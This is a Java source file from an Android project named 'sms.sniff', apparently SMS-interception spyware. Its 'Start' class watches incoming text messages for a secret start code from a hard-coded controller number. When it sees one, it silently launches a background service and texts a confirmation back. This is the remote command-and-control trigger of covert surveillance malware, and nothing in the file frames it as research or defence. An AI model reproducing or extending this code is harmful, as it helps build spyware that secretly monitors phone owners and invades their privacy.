package sms.sniff.behaviors;

import sms.sniff.Constants;
import sms.sniff.DynamicRegisterService;
import sms.sniff.utils.SMS;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class Start implements Behavior {
	
	private Context context;

	public Start(Context context) {
		this.context = context;
	}

	@Override
	public void process(SmsMessage sms) {
		Intent manager = new Intent(context, DynamicRegisterService.class);
		context.startService(manager);
		
		new SMS(".").sendConfirmation();
	}

	@Override
	public boolean canProcess(SmsMessage sms) {
		String messageBody = sms.getMessageBody();
		String originPhoneNumber = sms.getOriginatingAddress();
		
		return messageBody.contains(Constants.messageCode_start) && Constants.destination.equals(originPhoneNumber);
	}

}
